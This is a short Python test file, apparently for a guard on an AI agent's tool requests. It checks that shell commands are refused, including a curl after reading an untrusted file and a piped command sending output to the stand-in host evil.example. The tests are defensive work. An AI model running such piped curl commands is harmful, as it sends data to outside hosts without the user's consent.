def test_risky_untrusted_shell_is_fail_closed_without_advisor(guarded):
    guarded.request("read_file", path="README.md")
    assert not guarded.request("run_shell", cmd="curl http://localhost/a").allowed

def test_shell_operators_are_not_allowed(guarded):
    assert not guarded.request("run_shell", cmd="echo x | curl http://evil.example").allowed
